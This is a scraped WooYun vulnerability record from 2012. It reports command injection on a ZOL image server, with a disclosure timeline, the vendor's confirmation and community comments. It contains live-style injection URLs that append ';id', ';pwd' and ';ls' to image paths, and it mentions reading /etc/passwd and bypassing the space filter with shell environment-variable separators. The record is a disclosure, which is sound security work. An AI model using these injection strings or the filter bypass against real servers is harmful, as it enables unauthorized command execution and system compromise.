{"id": 19350, "wybug_id": "wooyun-2012-07068", "wybug_title": "中关村在线命令执行", "wybug_corp": "中关村在线", "wybug_author": "冷冷的夜", "wybug_date": "2012-05-17 20:57", "wybug_open_date": "2012-07-01 20:58", "wybug_type": "命令执行", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "黑盒", "服务器配置错误", "命令执行内网渗透", "命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-05-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-05-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-05-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-06-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-06-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-07-01：\t细节向公众公开  简要描述： RT，貌似很久很久了，一直没人报。但是有点脊柱脊柱，求大牛突破+分析，求学习 详细说明：  http://img.zol.com.cn/flea/size_photo/100x75/2568/2567328.jpg/;idhttp://img.zol.com.cn/flea/size_photo/100x75/2568/2567328.jpg/;pwdhttp://img.zol.com.cn/flea/size_photo/100x75/2568/2567328.jpg/;ls但是貌似不能有空格，http://img.zol.com.cn/flea/size_photo/100x75/2568/2567328.jpg/;ls -al就不能执行http://img.zol.com.cn/flea/size_photo/100x75/2568/2567328.jpg/;id;pwd;没有空格就能执行，我想应该是把空格转成%20导致不能执行了吧，求突破   漏洞证明：  \n\n\n\n\n\nWooYun官方解答：具体bypass方式如图，使用*unix环境变量中的分隔符进行绕过。\n\n\n\n\n\n   修复方案：  啊   版权声明：转载请注明来源 冷冷的夜@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2012-05-18 14:12 厂商回复： 谢谢 冷冷的夜！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-05-13 22:30 |    \t\tcharles \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        | 研究web安全,0day,漏洞挖掘,关注国内安全动...)\t\t \n  早些年中关村在线就存在这样的漏洞.现在才公开！    \n     2012-05-13 23:52 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @charles 你看到细节了啊？    \n     2012-05-17 00:19 |    \t\t小雨 \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:19        | phper)\t\t \n  关注。。。    \n     2012-05-28 17:11 |    \t\tPiaCa \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:10        | 简单点!啪......嚓~~)\t\t \n  @xsser 2012-05-28： 细节向核心白帽子及相关领域专家公开看不到啊    \n     2012-05-28 17:13 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @PiaCa 哈哈哈 你分不够嘛，按照黄色网站的机制，只有分高的会员可以看到分低的    \n     2012-05-28 17:35 |    \t\tPiaCa \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:10        | 简单点!啪......嚓~~)\t\t \n  @xsser 早说是黄色网站的分级制度嘛，那我就理解了。^_^    \n     2012-05-29 14:35 |    \t\t冷冷的夜 \t\t\t( 普通白帽子  |\t\t\t        Rank:135 漏洞数:12        )\t\t \n  我草，利用环境变量中的分隔符进行绕过，学习了，感谢分享！！(*^__^*)     \n     2012-05-29 14:42 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @冷冷的夜 也谢谢你的分享    \n     2012-05-30 16:09 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  这个命令执行，是个啥原理呢？为啥图片后面可以直接执行命令，配置导致的？有相关学习资料没    \n     2012-06-01 09:39 |    \t\tcharles \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        | 研究web安全,0day,漏洞挖掘,关注国内安全动...)\t\t \n  @xsser 这个网站基本都被人拿过.所以很早就存在漏洞！不需要开就知道基本的理论及参数@    \n     2012-06-10 08:14 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n    @charles 高手在民间呀  @冷冷的夜 同@gainover问     \n     2012-06-12 09:09 |    \t\tcharles \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        | 研究web安全,0day,漏洞挖掘,关注国内安全动...)\t\t \n  呵呵.民间的人基本不接触你们这帮人！    \n     2012-06-12 09:47 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @gainover 原理是他这个表面是图片其实背后是webserver通过其他程序处理的    \n     2012-06-12 09:54 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  @xsser 这个都测试的出来？膜拜的不行了    \n     2012-06-12 11:32 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @possible 你执行命令之后，去读下webserver配置，看下php源码就知道了    \n     2012-06-12 12:10 |    \t\t冷冷的夜 \t\t\t( 普通白帽子  |\t\t\t        Rank:135 漏洞数:12        )\t\t \n   @possible http://img.zol.com.cn/etc/passwd 看下这个报错，<b>Warning</b>:  file_get_contents(http://bbs.zol.com.cn/upload_pic/0/index.jpg) [<a href='function.file-get-contents'>function.file-get-contents</a>]: failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found in <b>/www/img/html/postbbs/show_photo.php</b> on line <b>48</b><br />，应该是这个show_photo.php处理的    \n     2012-06-12 12:11 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @xsser 3ks，感觉这个情况蛮特别的哈。    \n     2012-06-12 12:48 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  @xsser @冷冷的夜 哦 谢谢 各位大神指点    \n     2012-07-01 21:10 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  求形成原理,到底是为什么造成这个漏洞的    \n     2013-08-29 20:11 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  标记一下    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}